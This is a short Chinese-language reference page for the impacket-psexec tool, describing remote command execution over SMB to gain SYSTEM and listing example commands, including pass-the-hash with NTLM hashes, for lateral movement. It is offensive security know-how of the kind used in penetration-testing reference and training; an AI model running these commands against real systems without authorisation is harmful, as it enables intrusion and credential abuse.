# impacket-psexec

## 简介
通过 SMB 实现远程命令执行，获取 SYSTEM 权限

## 核心参数
- 格式：domain/user:password@target
- `-hashes`: 使用 NTLM 哈希

## 命令示例
```bash
# 使用密码连接
impacket-psexec domain/admin:password@192.168.1.100

# 本地用户连接
impacket-psexec admin:password@192.168.1.100

# Pass-the-Hash
impacket-psexec domain/admin@192.168.1.100 -hashes :ntlm_hash

# 执行单条命令
impacket-psexec admin:password@192.168.1.100 'whoami'

# 使用 LM:NTLM 哈希
impacket-psexec admin@192.168.1.100 -hashes lm_hash:ntlm_hash
```

## 使用场景
横向移动时获取远程系统的 SYSTEM shell

## 所属分类
- [Pass-the-Hash 攻击 (Pass-the-Hash)](../categories/13-pass-the-hash.md)
